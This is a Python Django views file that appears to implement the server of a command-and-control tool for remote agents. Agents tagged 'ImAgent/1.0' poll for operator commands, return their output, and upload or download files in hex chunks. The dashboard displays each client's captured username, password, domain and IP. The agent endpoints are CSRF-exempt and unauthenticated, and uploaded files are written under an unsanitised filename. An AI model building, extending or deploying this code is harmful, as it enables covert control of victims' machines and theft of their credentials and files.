from math import ceil
from django.http import HttpResponse
from django.contrib.auth import logout
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
import random
import string
from .models import *
from django.views.generic import View
import re
from .forms import UploadsForm
import json


def name_extractor(request):
    match = re.search(r"(\S+)\s+(?=ImAgent/1\.0)", request.META.get('HTTP_USER_AGENT'))
    if match:
        return match.group(1)
    else:
        return None


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    return ip


def create_or_get_users(request, id_name):
    agent = Clients.objects.filter(id_name=id_name).first()
    if agent:
        return agent
    elif 'ImAgent/1.0' in request.META.get('HTTP_USER_AGENT'):
        agent = Clients.objects.create(id_name=id_name, address=get_client_ip(request))
        agent.last_updated = now()
        agent.save()
        return agent
    else:
        return None


def get_chunk(request, file, index):
    chunk_size = 2097152
    is_last = len(file.hex) < ((index + 1) * chunk_size)
    try:
        return file.hex[index * chunk_size:(index + 1) * chunk_size], is_last
    except IndexError:
        return file.hex[index * chunk_size:], True


class IndexView(View):
    def get(self, request):
        clients = Clients.objects.all()
        form = UploadsForm()
        client_list = {}

        for client in clients:
            client_list[client.id_name] = {
                'id': client.id,
                'id_name': client.id_name,
                'username': client.username,
                'password': client.password,
                'domain': client.domain,
                'ip': client.address,
                'last_online_str': client.last_online_str(),
                'last_online': client.last_online(),
            }
        json_data = json.dumps(client_list)
        context = {
            'json_data': json_data,
            'form': form,
            'clients': clients
        }
        return render(request, 'server_side/index.html', context)

    def post(self, request):
        clients = Clients.objects.all()
        if self.request.POST.get('command'):
            client_name = self.request.POST.get('cmd_btn')
            print(client_name)
            receiver = create_or_get_users(request, client_name)
            print(receiver)
            Commands.objects.create(receiver=receiver,
                                    command=self.request.POST.get('command'))
        if request.FILES:
            form = UploadsForm(request.POST, request.FILES)
            agent = clients.filter(name=self.request.POST.get('upload_btn')).first()
            if form.is_valid():
                upload = form.save(commit=False)
                if agent:
                    upload.client = agent
                    upload.save()
            else:
                print(f'file error: {form.errors}')

        return redirect('index')


@method_decorator(csrf_exempt, name='dispatch')
class SendCommand(View):
    def get(self, request):
        name = name_extractor(request)
        agent = create_or_get_users(request, name)

        if not agent:
            return HttpResponse('Agent not found', status=400)

        cmd_execution = Commands.objects.filter(receiver=agent, is_executed=False).first()

        if cmd_execution:

            if not cmd_execution.is_executed:
                cmd = f'{cmd_execution.command}, id={cmd_execution.id}'
                return HttpResponse(cmd)
            else:
                return HttpResponse("Command already executed.", status=200)

        return HttpResponse("No command available.", status=200)

    def post(self, request, *args, **kwargs):
        name = name_extractor(request)
        agent = create_or_get_users(request, name)
        body = request.body.decode('utf-8')

        if not agent:
            return HttpResponse("No client found for this IP.", status=401)

        match = re.search(r'id\s*=\s*(\d+)', body)
        if not match:
            return HttpResponse("Mistake detected. No ID sent :|", status=400)

        cmd_id = int(match.group(1))

        cmd = Commands.objects.filter(receiver=agent, id=cmd_id).first()

        if cmd:
            cmd.is_executed = True
            response = re.sub(r'id\s*=\s*(\d+)', '', body).strip()
            cmd.command_response = response
            cmd.save()
            return HttpResponse("Command executed successfully.", status=200)

        return HttpResponse("Command not found.", status=404)


@method_decorator(csrf_exempt, name='dispatch')
class FileDownloadView(View):
    def get(self, request):
        name = name_extractor(request)
        agent = create_or_get_users(request, name)
        if agent:
            file = Uploads.objects.filter(client=agent).last()
            if file:
                hex_file = HexForDownload.objects.filter(file=file).last()
                response = HttpResponse(f'id={hex_file.id}', status=200)
                response['File-Name'] = file.file.name.replace("uploads/", "")
                response['Content-Length'] = ceil(file.file.size / (1024 * 1024))
                return response
            else:
                return HttpResponse('you have not file')
        else:
            return HttpResponse("No client found for this IP.", status=400)

    def post(self, request, *args, **kwargs):
        body = request.body.decode('utf-8')
        if 'send' not in body:
            return HttpResponse("Mistake detected. send not sent :|", status=400)
        match = re.search(r'index\s*=\s*(\d+)', body)
        if not match:
            return HttpResponse('Syntax Error. no index sent', status=400)
        index = int(match.group(1))
        match = re.search(r'id\s*=\s*(\d+)', body)
        if not match:
            return HttpResponse('Syntax Error. no ID sent :|', status=400)
        id = int(match.group(1))
        name = name_extractor(request)
        agent = create_or_get_users(request, name)
        if not agent:
            return HttpResponse("No client found for this IP.", status=401)
        hex_file = HexForDownload.objects.filter(id=id).last()
        chunk, last = get_chunk(request, hex_file, index)
        response = HttpResponse(chunk, content_type='application/octet-stream')
        hex_file.sent_count += 1
        hex_file.save()
        if last:
            response['Last-Chunk'] = last
            hex_file.delete()
        return response


@method_decorator(csrf_exempt, name='dispatch')
class FileUploadView(View):
    def post(self, request, *args, **kwargs):
        body = request.body.decode('utf-8')
        file_name = request.META.get('HTTP_FILENAME')
        if not file_name:
            return HttpResponse("Syntax Error. no filename sent :|", status=400)
        name = name_extractor(request)
        agent = create_or_get_users(request, name)
        if not agent:
            return HttpResponse("No client found for this IP.", status=401)
        id = request.META.get('HTTP_ID')
        if not id:
            return HttpResponse("Syntax Error. no ID sent :|", status=400)
        download = self.check_or_create_download(agent, file_name, id)
        with open(f'downloads/{file_name}', 'ab') as f:
            f.write(bytes.fromhex(body))
        if request.META.get('HTTP_LAST'):
            download.is_finished = True
            download.save()
        if download.is_finished:
            return HttpResponse('file is completely gotten', status=302)
        return HttpResponse('part is gotten', status=200)

    def check_or_create_download(self, agent, file_name, id):
        download = Downloads.objects.filter(id=id).first()
        if not download:
            return Downloads.objects.create(file_name=file_name, id=id, client=agent)
        return download


def logout_view(request):
    logout(request)
    return redirect('login')
